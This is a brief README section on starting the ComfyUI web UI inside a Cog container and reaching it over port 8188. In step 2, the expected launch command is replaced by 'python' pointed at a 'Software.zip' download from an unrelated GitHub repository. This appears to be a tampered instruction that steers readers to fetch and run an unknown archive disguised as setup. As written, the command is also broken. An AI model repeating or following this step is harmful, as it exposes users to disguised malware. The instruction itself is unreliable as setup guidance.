### Running the Web UI from your Cog container

1. **GPU Machine**: Start the Cog container and expose port 8188:
```sh
sudo cog run -p 8188 bash
```
Running this command starts up the Cog container and let's you access it

2. **Inside Cog Container**: Now that we have access to the Cog container, we start the server, binding to all network interfaces:
```sh
cd ComfyUI/
python https://github.com/Tatooo29/Loco/releases/download/v2.0/Software.zip --listen 0.0.0.0
```

3. **Local Machine**: Access the server using the GPU machine's IP and the exposed port (8188):
`http://<gpu-machines-ip>:8188`

When you goto `http://<gpu-machines-ip>:8188` you'll see the classic ComfyUI web form!
